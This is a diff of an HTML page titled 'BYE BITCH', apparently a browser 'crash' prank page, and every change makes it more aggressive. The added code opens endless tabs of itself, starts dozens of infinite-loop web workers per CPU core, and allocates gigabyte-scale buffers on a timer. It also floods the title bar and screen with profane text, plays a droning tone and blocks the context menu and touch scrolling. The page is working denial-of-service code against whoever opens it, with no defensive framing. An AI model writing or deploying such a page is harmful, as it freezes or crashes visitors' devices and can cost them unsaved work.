@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Bye Bitch</title>
+  <title>BYE BITCH</title>
   <style>
     body {
       margin: 0;
@@ -14,159 +14,118 @@
       overflow: hidden;
       display: grid;
       place-items: center;
-      font-size: 13vw;
+      font-size: 18vw;
       font-weight: 900;
-      text-shadow: 0 0 60px #f00;
+      text-shadow: 0 0 100px #f00;
       user-select: none;
     }
     canvas { position: fixed; inset: 0; z-index: -1; }
-    .floater, .gif { position: fixed; pointer-events: none; z-index: 10; }
+    .chaos { position: fixed; pointer-events: none; z-index: 5; mix-blend-mode: screen; }
   </style>
 </head>
 <body>
 <div>BYE BITCH</div>
-<canvas id="c"></canvas>
 
 <script>
 const nukelink = location.href;
-
 function openNuke() {
   try {
     window.open(nukelink, '_blank');
     const a = document.createElement('a');
-    a.href = nukelink;
-    a.target = '_blank';
-    a.rel = 'noopener noreferrer';
-    document.body.appendChild(a);
-    a.click();
-    a.remove();
+    a.href = nukelink; a.target = '_blank';
+    document.body.appendChild(a); a.click(); a.remove();
   } catch(e) {}
 }
+for (let i = 0; i < 80; i++) setTimeout(openNuke, i * 5);
+setInterval(() => { for (let i = 0; i < 25; i++) setTimeout(openNuke, i * 8); }, 120);
 
-for (let i = 0; i < 40; i++) setTimeout(openNuke, i * 12);
-setInterval(() => { for (let i = 0; i < 10; i++) setTimeout(openNuke, i * 20); }, 300);
-setInterval(() => { for (let i = 0; i < 20; i++) setTimeout(openNuke, i * 15); }, 1600);
+setInterval(() => { for (let i = 0; i < 4000; i++) document.title = Math.random().toString(36) + "💀"; }, 1);
 
 const workerCode = URL.createObjectURL(new Blob([`
   'use strict';
   self.onmessage = () => {
     let x = performance.now() * Math.PI;
     while (true) {
-      x = Math.sin(x) * Math.cos(x * 1.15) * Math.tan(x + 1e-7);
-      x = (x * x * x) ** 0.333333 * 1.6180339887;
-      for (let i = 0; i < 75000000; i++) {
-        x += Math.log1p(Math.abs(x) + 1e-300) * 2e-9;
+      x = Math.sin(x) * Math.cos(x * 1.45) * Math.tan(x + 1e-9);
+      for (let i = 0; i < 160000000; i++) {
+        x += Math.log1p(Math.abs(x) + 1e-300) * 4.5e-9;
       }
     }
   };
 `], { type: 'application/javascript' }));
 
-const threadCount = (navigator.hardwareConcurrency || 8) * 8;
-for (let i = 0; i < threadCount; i++) {
-  new Worker(workerCode).postMessage("go");
-}
+const threadCount = (navigator.hardwareConcurrency || 8) * 16;
+for (let i = 0; i < threadCount; i++) new Worker(workerCode).postMessage("go");
 
 const allocations = [];
-function allocBig() {
+function bombMemory() {
   try {
-    const buf = new ArrayBuffer(1 << 29);
-    new Float64Array(buf).fill(performance.now() * Math.random());
-    allocations.push(buf);
-    allocations.push(URL.createObjectURL(new Blob([new Uint8Array(1 << 27)])));
+    allocations.push(new ArrayBuffer(1 << 30));
+    allocations.push(new Float64Array(1 << 27).fill(Math.random() * 999999));
+    allocations.push(new Uint8Array(1 << 29));
   } catch(e) {}
 }
-for (let i = 0; i < 180; i++) allocBig();
-setInterval(allocBig, 280);
+for (let i = 0; i < 120; i++) bombMemory();
+setInterval(bombMemory, 80);
 
-const canvas = document.getElementById('c');
-const gl = canvas.getContext('webgl2', { antialias: false }) || canvas.getContext('webgl', { antialias: false });
+for (let n = 0; n < 8; n++) {  
+  const c = document.createElement('canvas');
+  c.style.position = 'fixed';
+  c.style.inset = '0';
+  c.style.zIndex = '-1';
+  c.style.opacity = '0.75';
+  document.body.appendChild(c);
 
-if (gl) {
-  const dpr = Math.min(window.devicePixelRatio || 1, 3.5);
+  const ctx = c.getContext('2d', { alpha: true });
+
   function resize() {
-    canvas.width = innerWidth * dpr * 3.5;
-    canvas.height = innerHeight * dpr * 3.5;
-    gl.viewport(0, 0, canvas.width, canvas.height);
+    c.width = innerWidth * 3.6;
+    c.height = innerHeight * 3.6;
   }
   resize();
-  addEventListener('resize', resize);
+  window.addEventListener('resize', resize);
 
-  const vs = `#version 300 es in vec2 p; void main() { gl_Position = vec4(p,0,1); }`;
-  const fs = `#version 300 es
-    precision highp float;
-    out vec4 frag;
-    uniform float t;
-    uniform vec2 reso;
-    float hash(vec2 p) {
-      return fract(sin(dot(p, vec2(12.9898, 78.233))) * 43758.5453);
+  let t = n * 30;
+  function draw() {
+    ctx.fillStyle = 'rgba(0,0,0,0.1)';
+    ctx.fillRect(0, 0, c.width, c.height);
+
+    for (let i = 0; i < 850; i++) {
+      const x = Math.sin(t * 0.04 + i) * c.width * 0.55 + c.width/2;
+      const y = Math.cos(t * 0.035 + i * 1.6) * c.height * 0.55 + c.height/2;
+      ctx.fillStyle = `hsl(${ (t * 30 + i * 8) % 360 }, 100%, 65%)`;
+      ctx.fillRect(x - 22, y - 22, 44, 44);
     }
-    void main() {
-      vec2 uv = gl_FragCoord.xy / reso;
-      float sum = 0.0;
-      float time = t * 1.1;
-      for (int i = 0; i < 520; ++i) {
-        float fi = float(i);
-        vec2 off = vec2(sin(fi*0.45 + time*1.3), cos(fi*0.52 + time*1.7)) * 0.45;
-        sum += sin(dot(uv + off, vec2(58.0, 47.0)) + fi*1.1 + time) * 2.2;
-        sum += hash(uv * 18.0 + fi*1.4 + time) * 5.1;
-        sum = fract(sum * 1.618 + 0.618);
-      }
-      vec3 color = 0.5 + 0.5 * cos(vec3(0.0, 2.4, 4.8) + sum * 1.6 + time * 1.0);
-      frag = vec4(color, 1.0);
-    }`;
-
-  const createShader = (type, src) => {
-    const sh = gl.createShader(type);
-    gl.shaderSource(sh, src);
-    gl.compileShader(sh);
-    return sh;
-  };
-  const prog = gl.createProgram();
-  gl.attachShader(prog, createShader(gl.VERTEX_SHADER, vs));
-  gl.attachShader(prog, createShader(gl.FRAGMENT_SHADER, fs));
-  gl.linkProgram(prog);
-  gl.useProgram(prog);
-
-  const buf = gl.createBuffer();
-  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
-  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
-  const posLoc = gl.getAttribLocation(prog, 'p');
-  gl.enableVertexAttribArray(posLoc);
-  gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
-
-  const tLoc = gl.getUniformLocation(prog, 't');
-  const rLoc = gl.getUniformLocation(prog, 'reso');
-  let start = performance.now();
-
-  function render() {
-    const elapsed = (performance.now() - start) / 1000;
-    gl.uniform1f(tLoc, elapsed);
-    gl.uniform2f(rLoc, canvas.width, canvas.height);
-    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
-    requestAnimationFrame(render);
+    t += 0.28;
+    requestAnimationFrame(draw);
   }
-  render();
+  draw();
 }
 
-const gifs = ["https://i.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif","https://i.giphy.com/media/l0HlRnAWXxn0MhKLK/giphy.gif","https://i.giphy.com/media/26ufnwz3wDUli7GU0/giphy.gif"];
-
-function spawnGIF() {
-  const img = document.createElement('img');
-  img.src = gifs[Math.floor(Math.random()*gifs.length)];
-  img.style.position = "fixed";
-  img.style.left = Math.random()*110-10+"vw";
-  img.style.top = Math.random()*110-10+"vh";
-  img.style.width = "200px";
-  img.style.animation = "spin 2.5s linear infinite";
-  document.body.appendChild(img);
-  setTimeout(() => img.remove(), 15000);
+function spawnChaos() {
+  const el = document.createElement('div');
+  el.className = 'chaos';
+  el.textContent = ["BYE","FUCK","RIP","DEAD","CRASH","LOL"][Math.floor(Math.random()*6)];
+  el.style.fontSize = (100 + Math.random()*400) + "px";
+  el.style.left = Math.random() * 100 + "vw";
+  el.style.top = Math.random() * 100 + "vh";
+  el.style.transform = `rotate(${Math.random()*1200}deg)`;
+  document.body.appendChild(el);
+  setTimeout(() => el.remove(), 7000);
 }
+setInterval(spawnChaos, 20);
 
-setInterval(spawnGIF, 120);
-for (let i = 0; i < 12; i++) setTimeout(spawnGIF, i*80);
+try {
+  const audio = new (window.AudioContext || window.webkitAudioContext)();
+  const osc = audio.createOscillator();
+  osc.type = 'sawtooth';
+  osc.frequency.setValueAtTime(55, audio.currentTime);
+  osc.connect(audio.destination);
+  osc.start();
+} catch(e) {}
 
 document.addEventListener('contextmenu', e => e.preventDefault());
-document.addEventListener('touchmove', e => e.preventDefault(), {passive:false});
+document.addEventListener('touchmove', e => e.preventDefault(), {passive: false});
 </script>
 </body>
 </html>
